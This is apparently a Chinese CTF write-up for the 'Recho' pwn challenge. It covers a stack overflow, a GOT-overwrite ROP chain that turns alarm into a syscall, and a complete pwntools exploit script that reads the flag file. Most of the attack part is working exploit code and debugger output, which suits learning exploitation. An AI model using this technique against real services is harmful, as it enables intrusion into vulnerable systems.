
```c
int __cdecl main(int argc, const char **argv, const char **envp) {
    char input[16]; // [rsp+0h] [rbp-40h] BYREF
    char buf[40]; // [rsp+10h] [rbp-30h] BYREF
    int v6; // [rsp+38h] [rbp-8h]
    int len; // [rsp+3Ch] [rbp-4h]
    Init();
    write(1, "Welcome to Recho server!\n", 0x19uLL);
    while ( read(0, input, 0x10uLL) > 0 )
    {
        len = atoi(input);
        if ( len <= 15 )
            len = 16;
        v6 = read(0, buf, len);
        buf[v6] = 0;
        printf("%s", buf);
    }
    return 0;
}
```

可以发现明显的栈溢出的漏洞，但是第二次循环时必须让`read`返回`0`才能顺利`return`，可以用这样的语句关闭流：

```python
io.shutdown('write')
```

但之后都不能写入流了，除非重开程序。那么这就要求我们一次输入完成ROP利用链条。在程序中搜到的一些信息：

```bash
gef➤ disass read
Dump of assembler code for function read:
0x00007ffff7b04350 <+0>:
    cmp DWORD PTR [rip+0x2d23e9],0x0 # 0x7ffff7dd6740 <__libc_multiple_threads>
0x00007ffff7b04357 <+7>:
    jne 0x7ffff7b04369 <read+25>
0x00007ffff7b04359 <+0>:
    mov eax,0x0
0x00007ffff7b0435e <+5>:
    syscall
```

`.data:0000000000601058 flag db 'flag',0`

```bash
dc@ubuntu:/playground$ ROPgadget --binary ./Recho --only "pop|ret" | grep 'rax'
0x00000000004006fc : pop rax ; ret

dc@ubuntu:/playground$ ROPgadget --binary ./Recho --only "pop|ret" | grep 'rdi'
0x00000000004008a3 : pop rdi ; ret
```

```bash
dc@ubuntu:/playground$ ROPgadget --binary ./Recho
Gadgets information
...
0x000000000040070d : add byte ptr [rdi], al ; ret  <-- use it attack got['alarm']
```

这里参考了大佬的wp：[409K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4y4W2j5h3q4K6k6h3g2K6j5g2)9J5c8X3q4J5N6r3W2U0L8r3g2Q4x3V1k6V1k6i4c8S2K9h3I4K6i4K6u0r3x3e0l9J5z5e0V1J5z5o6R3%4](https://bbs.kanxue.com/elink@407K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4y4W2j5h3q4K6k6h3g2K6j5g2)9J5c8X3q4J5N6r3W2U0L8r3g2Q4x3V1k6V1k6i4c8S2K9h3I4K6i4K6u0r3x3e0l9J5z5e0V1J5z5o6R3%4)

### 利用思路总结
1. 利用`Gadget`配合修改`alarm`函数的`got`表项，令其指向`alarm+5`，也就是`syscall`。
2. 有了`syscall`，传入对应的`eax`，执行`open`操作打开`flag`文件。
3. 接下来用`read`、`write`直接将`flag`数据输出。

### 优化过的 exp
```python
import sys
from pwn import *
from LibcSearcher import LibcSearcher

rv = lambda : io.recv()
rl = lambda a=False : io.recvline(a)
ru = lambda a,b=True : io.recvuntil(a,b)
rn = lambda x : io.recvn(x)
se = lambda x : io.send(x)
sl = lambda x : io.sendline(x)
sa = lambda a,b : io.sendafter(a,b)
sla = lambda a,b : io.sendlineafter(a,b)
sconnect = lambda : io.interactive()

context.log_level = "DEBUG"
pwn_file = './Recho'
elf = ELF(pwn_file)

if len(sys.argv) < 2:
    IS_LOCAL = 1
    io = process(pwn_file)
else:
    IS_LOCAL = 0
    sys_argv = sys.argv[1].split(':')
    io = remote(sys_argv[0], int(sys_argv[1]))
#---------------------------------------------------------
flag_str = 0x0000000000601058
pop_rax_ret = 0x00000000004006fc
pop_rdi_ret = 0x00000000004008a3
save_flag_addr = 0x0000000000601060
add_ptr_rdi_al = 0x000000000040070d
sysenter_addr = alarm_addr = elf.got['alarm']

def com_gadget(part1, part2, jmp2, arg1 = 0x0, arg2 = 0x0, arg3 = 0x0):
    payload = p64(part1)
    payload += p64(0x0)
    payload += p64(0x1)
    payload += p64(jmp2)
    payload += p64(arg3)
    payload += p64(arg2)
    payload += p64(arg1)
    payload += p64(part2)
    payload += 'A' * 56
    return payload

p1 = 0x40089A
p2 = 0x400880
payload = 'A'*0x38 + p64(pop_rax_ret) + p64(5) + p64(pop_rdi_ret) + p64(alarm_addr) + p64(add_ptr_rdi_al) \
+ p64(pop_rax_ret) + p64(2) + com_gadget(p1,p2,sysenter_addr,flag_str,0) \
+ com_gadget(p1,p2,elf.got['read'],3,save_flag_addr,50) \
+ com_gadget(p1,p2,elf.got['write'],1,save_flag_addr,50)

if IS_LOCAL:
    gdb.attach(io,"break *0x400889\nc")
    pause()

rv()
se(str(len(payload)))
se(payload)
rv()
io.shutdown('write')
print(rv())
```

## 参考文章
1. 攻防世界PWN之Recho题解 [be4K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4y4W2j5h3q4K6k6h3g2K6j5g2)9J5c8X3q4J5N6r3W2U0L8r3g2Q4x3V1k6V1k6i4c8S2K9h3I4K6i4K6u0r3x3e0l9J5z5e0V1J5z5o6R3%4](https://bbs.kanxue.com/elink@beaK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4y4W2j5h3q4K6k6h3g2K6j5g2)9J5c8X3q4J5N6r3W2U0L8r3g2Q4x3V1k6V1k6i4c8S2K9h3I4K6i4K6u0r3x3e0l9J5z5e0V1J5z5o6R3%4)
2. 攻防世界PWN之note-service2题解 [63bK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4y4W2j5h3q4K6k6h3g2K6j5g2)9J5c8X3q4J5N6r3W2U0L8r3g2Q4x3V1k6V1k6i4c8S2K9h3I4K6i4K6u0r3x3e0l9K6x3o6l9K6x3e0j5%4](https://bbs.kanxue.com/elink@2f5K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4y4W2j5h3q4K6k6h3g2K6j5g2)9J5c8X3q4J5N6r3W2U0L8r3g2Q4x3V1k6V1k6i4c8S2K9h3I4K6i4K6u0r3x3e0l9K6x3o6l9K6x3e0j5%4)
3. 攻防世界 Pwn 进阶 第一页 [892K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4W2G2L8X3N6T1j5h3!0A6K9g2)9J5c8X3q4J5N6r3W2U0L8r3g2Q4x3V1k6V1k6i4c8S2K9h3I4K6i4K6u0r3x3e0l9&6x3o6f1&6y4U0x3H3](https://bbs.kanxue.com/elink@630K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4W2G2L8X3N6T1j5h3!0A6K9g2)9J5c8X3q4J5N6r3W2U0L8r3g2Q4x3V1k6V1k6i4c8S2K9h3I4K6i4K6u0r3x3e0l9&6x3o6f1&6y4U0x3H3)
4. CTF-ALL-IN-ONE 四、技巧篇 [621K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6X3K9i4u0E0K9h3q4F1j5i4W2Q4x3X3g2Y4K9i4c8T1L8$3!0C8i4K6u0W2K9h3!0Q4x3V1k6U0N6r3k6Q4x3X3c8S2L8r3I4Q4x3X3c8A6L8W2)9J5k6r3!0F1k6g2)9J5c8U0c8Q4y4h3k6@1K9i4m8K6](https://bbs.kanxue.com/elink@08cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6X3K9i4u0E0K9h3q4F1j5i4W2Q4x3X3g2Y4K9i4c8T1L8$3!0C8i4K6u0W2K9h3!0Q4x3V1k6U0N6r3k6Q4x3X3c8S2L8r3I4Q4x3X3c8A6L8W2)9J5k6r3!0F1k6g2)9J5c8U0c8Q4y4h3k6@1K9i4m8K6)
5. 详解64位静态编译程序的fini_array劫持及ROP攻击 [12aK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2X3M7X3g2W2j5Y4g2X3i4K6u0W2j5$3!0E0i4K6u0r3j5i4u0@1K9h3y4D9k6i4y4Q4x3V1k6K6P5i4y4@1k6h3#2Q4x3V1j5J5x3U0j5H3x3o6y4Q4x3X3g2Z5N6r3#2D9](https://bbs.kanxue.com/elink@c83K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2X3M7X3g2W2j5Y4g2X3i4K6u0W2j5$3!0E0i4K6u0r3j5i4u0@1K9h3y4D9k6i4y4Q4x3V1k6K6P5i4y4@1k6h3#2Q4x3V1j5J5x3U0j5H3x3o6y4Q4x3X3g2Z5N6r3#2D9)
